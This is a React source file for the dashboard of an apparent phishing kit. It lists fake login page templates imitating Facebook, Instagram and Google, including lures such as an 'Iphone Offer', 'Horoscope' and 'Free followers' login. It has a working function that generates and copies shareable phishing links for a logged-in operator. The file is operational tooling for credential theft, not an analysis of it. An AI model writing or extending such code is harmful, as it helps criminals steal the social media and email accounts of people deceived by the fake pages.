import { Link } from "react-router-dom";
import NavBar from "../components/NavBar";
import VerifyUser from "../utils/VerifyUser";
import custom_axios from "../axios/custom_axios";
import { ApiConstants } from "../api/api_constants";
import { getLoginInfo } from "../utils/LoginInfo";
import { toast } from "react-toastify";
import { useState } from "react";
import FbSimpleLogin from "./phisPages/facebookAssets/simpleLogin.png";

export default function Home() {
    VerifyUser();

    const [link, setLink] = useState({
        address: "",
        socialName: "",
        socialType: "",
        link_id: "",
    });
    async function generateLink() {
        try {
            const response = await custom_axios.post(ApiConstants.LINK.CREATE, {
                user_id: getLoginInfo()?.uuid,
                socialName: "Facebook",
                socialType: "Simple Login",
            });
            console.log(response.data);
            toast.success(response.data.msg);

            setLink(response.data.link);
            console.log(link);
        } catch (error: any) {
            console.log(error);
            toast.error(
                error.response.data.msg ||
                    error.message ||
                    "Error in generating link"
            );
        }
    }
    return (
        <>
            <NavBar></NavBar>

            <div className="cvMain" id="cvPage">
                <div className="page">
                    <div>
                        <span>Facebook</span>
                        <ul>
                            <li>
                                <h2>Simple Login (works)</h2>
                                <div
                                    style={{
                                        display: "flex",
                                        float: "left",
                                        padding: "10px",
                                        height: "400px",
                                    }}
                                >
                                    <img
                                        src={FbSimpleLogin}
                                        alt="Facebook Simple Login"
                                    />
                                </div>
                                <button className="active-btn">
                                    <Link to={"/user/wwwfacebookcom"}>
                                        <span>Preview</span>
                                    </Link>
                                </button>
                                <button className="active-btn">
                                    <span onClick={generateLink}>
                                        Generate Link
                                    </span>
                                </button>
                                {link.address && (
                                    <span>
                                        <a href={link.address} target="_blank">
                                            Visit
                                        </a>
                                        <button
                                            className="active-btn"
                                            onClick={() => {
                                                navigator.clipboard.writeText(
                                                    link.address
                                                );
                                                toast.success(
                                                    "Copied to clipboard"
                                                );
                                            }}
                                        >
                                            Copy
                                        </button>
                                    </span>
                                )}
                            </li>
                            <li>
                                <h2>Iphone Offer Login</h2>
                                <button className="active-btn">
                                    <Link to={"/user/wwwfacebookcom"}>
                                        <span>Preview</span>
                                    </Link>
                                </button>
                                <button className="active-btn">
                                    <span>Generate Link</span>
                                </button>
                            </li>
                            <li>
                                <h2>Horoscope Login</h2>
                                <button className="active-btn">
                                    <Link to={"/user/wwwfacebookcom"}>
                                        <span>Preview</span>
                                    </Link>
                                </button>
                                <button className="active-btn">
                                    <span>Generate Link</span>
                                </button>
                            </li>
                        </ul>
                    </div>
                    <div>
                        <span>Instagram</span>
                        <ul>
                            <li>
                                <h2>Simple Login</h2>
                                <button className="active-btn">
                                    <Link to={"/user/wwwinstagramcom"}>
                                        <span>Preview</span>
                                    </Link>
                                </button>
                                <button className="active-btn">
                                    <span>Generate Link</span>
                                </button>
                            </li>
                            <li>
                                <h2>Free followers Login</h2>
                                <button className="active-btn">
                                    <Link to={"/user/wwwinstagramcom"}>
                                        <span>Preview</span>
                                    </Link>
                                </button>
                                <button className="active-btn">
                                    <span>Generate Link</span>
                                </button>
                            </li>
                        </ul>
                    </div>
                    <div>
                        <span>Google</span>
                        <ul>
                            <li>
                                <h2>Simple Login</h2>
                                <button className="active-btn">
                                    <Link to={"/user/wwwgooglecom"}>
                                        <span>Preview</span>
                                    </Link>
                                </button>
                                <button className="active-btn">
                                    <span>Generate Link</span>
                                </button>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </>
    );
}
